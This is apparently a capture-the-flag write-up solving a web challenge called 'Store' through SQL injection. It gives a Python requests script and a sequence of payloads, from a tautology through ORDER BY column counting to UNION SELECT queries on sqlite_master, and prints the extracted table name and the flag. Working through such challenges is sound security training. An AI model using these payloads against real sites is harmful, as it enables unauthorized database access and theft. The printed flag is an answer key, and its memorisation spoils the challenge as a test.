# Store

## Description
```
https://store.web.actf.co/
```

## Writeup

Starting off, I inspected the website and the input field. <br/>
Testing simple injections I was able to cause a simple `SQLi` using `' or 1=1; -- `. <br/>
To be more efficient I automated this process using python. <br/>
```py
import requests

base_URL = 'https://store.web.actf.co/'

payload = {
    'item': "' or 1=1; -- "
}

res = requests.post(f'{base_URL}search', data=payload)

print(res.text)
```

The reason I knew it worked was that the response from the sever included all 3 possible products instead of a single one. <br/>
Having found the correct vulnerability I tried to enumerate the system. <br/>
Using injections to guess the amount of columns being used: <br/>
```js
/* Worked */
' ORDER BY 1; -- 
' ORDER BY 2; -- 
' ORDER BY 3; -- 

/* Didn't work */
' ORDER BY 4; -- 
```

To verify this I used a `UNION` query injection with 3 columns. <br/>
```sql
' UNION SELECT '1', '1', '1'; -- 
```

This query worked so I tried to enumerate the `sql tables` using the query below.
```py
payload = {
    'item': "' UNION SELECT '1', name, '1' FROM sqlite_master WHERE type='table'; -- "
}
```
This returned the following result:
```html
<table>
    <tr>
        <th>Name</th>
        <th>Details</th>
    </tr>
    
        <tr>
            <td>flags2cdc14366379a92e44d8f438ff39afe6</td>
            <td>1</td>
        </tr>
    
        <tr>
            <td>items</td>
            <td>1</td>
        </tr>
    
        <tr>
            <td>sqlite_sequence</td>
            <td>1</td>
        </tr>
    
</table>
```

Knowing the table I did another `UNION SQL Injection` to obtain the flag.
```py
payload = {
    'item': "' UNION SELECT '1', flag, '1' FROM flags2cdc14366379a92e44d8f438ff39afe6; -- "
}
```
This returned the flag which concludes this writeup.
```html
<table>
    <tr>
        <th>Name</th>
        <th>Details</th>
    </tr>
                
    <tr>
        <td>actf{37619bbd0b81c257b70013fa1572f4ed}</td>
        <td>1</td>
    </tr>           
</table>
```